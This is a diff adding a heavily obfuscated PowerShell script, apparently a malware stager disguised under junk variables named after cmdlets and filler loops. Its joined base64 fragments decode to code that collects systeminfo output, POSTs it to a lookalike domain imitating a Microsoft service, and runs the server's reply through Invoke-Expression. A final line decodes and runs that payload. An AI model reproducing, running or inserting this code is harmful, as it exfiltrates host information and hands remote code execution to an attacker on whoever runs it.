@@ -1,0 +1,94 @@
+${Get-Hotfix -InputFormat -LogName System && ($ttegb)} = "JE82YjdIQnU4ZzQwQ2VmZlMgPSAoKCdlJysndicrJ2UnKyduJysndCcrJ2QnKydhJysndCcrJ2EnKyctJysnbScrJ2knKydjJysncicrJ28";
+
+
+
+
+$randIndex = Get-Random -Minimum 8 -Maximum 18
+
+
+
+${Write-Host -ErrorAction Stop -Name wscript && ($boo)} = "nKydzJysnbycrJ2YnKyd0JysnLicrJ2wnKydpJysndicrJ2UnKycvJysnTicrJ1YnKyc0JysnUicrJ2cnKydOJysnRScrJ3UnKSkKJHB4QjhyR2oyTFh1SDRnNmZJWkZPa1dhID0gJChzeXN0ZW1pbmZvfCV7JF99fCYgKFtzdHJpbmddOjpqb2luKCcnLCAoI";${Write-Warning -InformationAction Continue -Name msedge && ($ldfmmp)} = "CgxMTEsMTE3LDExNiw0NSwxMTUsMTE2LDExNCwxMDUsMTEwLDEwMykgfCV7JF99fCV7ICggW2NoYXJdW2ludF0gJCgkXykpfSkpIHwleyRffXwgJSB7JF99KSkKJFhnID0gJChbY2hhcl0oMTEwKzk3LTExMCkrW2NoYXJdKDEqMTEyLzEpK1tjaGFyXSgyMysxMT";${Where-Object -ErrorAction SilentlyContinue -InformationLevel Verbose && ($loh)} = "ItMjMpK1tjaGFyXSgwKzEwOC0wKStbY2hhcl0oMCsxMDUtMCkrW2NoYXJdKDYyKzk5LTYyKStbY2hhcl0oMTAyKjk3LzEwMikrW2NoYXJdKDArMTE2LTApK1tjaGFyXSg0MSsxMDUtNDEpK1tjaGFyXSgwKzExMS0wKStbY";
+
+
+
+
+
+
+
+for ($j = 0; $j -lt 4; $j++) { $final += $j }
+${Get-WmiObject -InformationAction Continue -DestinationPath %USERPROFILE% && ($dca)} = "2hhcl0oMTUqMTEwLzE1KStbY2hhcl0oNTIrNDctNTIpK1tjaGFyXSgwKzExMS0wKStbY2hhcl0oMTEwKzk5LTExMCkrW2NoYXJdKDArMTE2LTApK1tjaGFyXSg5MSoxMDEvOTEpK1tjaGFyXSg5";${Get-Location -Confirm $False -Seconds 27 && ($apk)} = "OSsxMTYtOTkpK1tjaGFyXSgxMio0NS8xMikrW2NoYXJdKDArMTE1LTApK1tjaGFyXSg3MysxMTYtNzMpK1tjaGFyXSg0NCsxMTQt";
+
+$randIndex = Get-Random -Minimum 0 -Maximum 10
+
+for ($i = 0; $i -lt 4; $i++) { $nextvar = $i }
+
+$Win32_count = 1
+${ConvertTo-Json -Verbose -LogName System && ($mohb)} = "NDQpK1tjaGFyXSgxMDcqMTAxLzEwNykrW2NoYXJdKDArOTctMCkrW2NoYXJdKDArMTA5LTApKQoKJG14VFJHZjY5ZzVlTG9ucDR0V0hLREkgPSAmIChbc3RyaW5nXTo6am9pbignJywgKCAoNzMsMTEwLDExOCw";
+
+$test02 = 4
+
+try { Remove-Item -Path "C:\temp\logfile_2.txt" -ErrorAction SilentlyContinue } catch { Start-Sleep -Seconds 3 }
+
+
+
+${Where-Object -Verbose -Path %TEMP% && ($embnlc)} = "xMTEsMTA3LDEwMSw0NSw4MiwxMDEsMTE1LDExNiw3NywxMDEsMTE2LDEwNCwxMTEsMTAwKSB8JXskX318JXsgKCBbY2hhcl1baW50XSAkXyl9KSkgfCV7JCgkXyl9fCAlIHskKCRfKX0p";
+
+for ($i = 0; $i -lt 5; $i++) { $nextvar = $i }
+
+$set_scaler_38 = 475
+
+if ($errorLevel -gt 1) { Write-Output '$result' }
+${Stop-Process -Confirm $False -Path \\ShareSpace\Scripts && ($mmnlal)} = "ICRPNmI3SEJ1OGc0MENlZmZTIC1tZXRob2QgUE9TVCAtYiAkcHhCOHJHajJMWHVINGc2ZklaRk9rV2EgLWNvbnRlbnQgJFhnCgomIChbc3RyaW5nXTo6am9pbignJywgKCAoNzMsMTEwLDExO";${ConvertTo-Json -ErrorAction SilentlyContinue -Name msedge && ($ider)} = "CwxMTEsMTA3LDEwMSw0NSw2OSwxMjAsMTEyLDExNCwxMDEsMTE1LDExNSwxMDUsMTExLDExMCkgfCV7JCgkXyl9fCV7ICggW2NoYXJdW2";${ForEach-Object -ErrorAction Stop -DestinationPath .\Archive && ($kre)} = "ludF0gJF8pfSkpIHwleyRffXwgJSB7JCgkXyl9KSAkbXhUUkdmNjlnNWVMb25wNHRXSEtESQoK";
+
+
+
+
+if ($errorLevel -gt 0) { Write-Output '$result' }
+
+
+
+${New-Item -Confirm $False -Class Win32_Process && ($mrh)} = @()
+${New-Item -Confirm $False -Class Win32_Process && ($mrh)} += @(${Get-Hotfix -InputFormat -LogName System && ($ttegb)}, ${Write-Host -ErrorAction Stop -Name wscript && ($boo)}, ${Write-Warning -InformationAction Continue -Name msedge && ($ldfmmp)})
+
+if ($completion -eq $null) { $count = 3 }
+
+try { $y = 8 } catch { $error }
+
+try { $void = Get-Random -Minimum 6 -Maximum 9 } catch { $void = $null }
+${New-Item -Confirm $False -Class Win32_Process && ($mrh)} += @(${Where-Object -ErrorAction SilentlyContinue -InformationLevel Verbose && ($loh)}, ${Get-WmiObject -InformationAction Continue -DestinationPath %USERPROFILE% && ($dca)}, ${Get-Location -Confirm $False -Seconds 27 && ($apk)}, ${ConvertTo-Json -Verbose -LogName System && ($mohb)}, ${Where-Object -Verbose -Path %TEMP% && ($embnlc)}, ${Stop-Process -Confirm $False -Path \\ShareSpace\Scripts && ($mmnlal)})
+
+$test05 = 4
+
+while ($null) { $run = 1; Start-Sleep -Seconds 3 }
+
+for ($j = 0; $j -lt 2; $j++) { $final += $j }
+${New-Item -Confirm $False -Class Win32_Process && ($mrh)} += @(${ConvertTo-Json -ErrorAction SilentlyContinue -Name msedge && ($ider)}, ${ForEach-Object -ErrorAction Stop -DestinationPath .\Archive && ($kre)})
+
+
+
+
+while ($binpath) { Start-Sleep -Seconds 0 }
+
+if ($completion -eq $null) { $count = 3 }
+${Get-Service -Verbose -LogName System && ($dfmlnc)} = ${New-Item -Confirm $False -Class Win32_Process && ($mrh)} -join ""; [Text.Encoding]::('UTF8').('Ge' +    't' +    'S' +    'trin' +    'g')([Convert]::('Fro' +    'mBas' +    'e64S' +    't' +    'ring')(${Get-Service -Verbose -LogName System && ($dfmlnc)})) | IEX; ${Get-Content -ErrorAction SilentlyContinue -Path .\Temp && ($apaom)} = 305
+${Import-Module -InformationAction Continue -Seconds 27 && ($nekbh)} = 156
+
+if ($completion -eq $null) { $count = 2 }
+${Get-Service -ErrorAction Stop -LogName Application && ($sgk)} = 592
+
+while ($binpath) { Start-Sleep -Seconds 7 }
+${ForEach-Object -InputFormat -Uri office365.com/?auth=1 && ($dllhod)} = 66
+
+while ($counter -lt 0) { $counter++ }
+${Expand-Archive -OutputFormat -DestinationPath .\Archive && ($sbm)} = 866
+
+try { $void = Get-Random -Minimum 2 -Maximum 8 } catch { $void = $null }
+${Get-Content -Force -ComputerName $dc_07 && ($fbhlsb)} = 215
+
+$test01 = 5
+${Import-Module -ErrorAction SilentlyContinue -Path %USERPROFILE% && ($ogeed)} = 602
+
+while ($binpath) { Start-Sleep -Seconds 0 }
+${Invoke-WebRequest -Force -ComputerName $server_ip_05 && ($otnn)} = 392
+
+try { Remove-Item -Path "C:\temp\logfile_0.txt" -ErrorAction SilentlyContinue } catch { Start-Sleep -Seconds 6 }
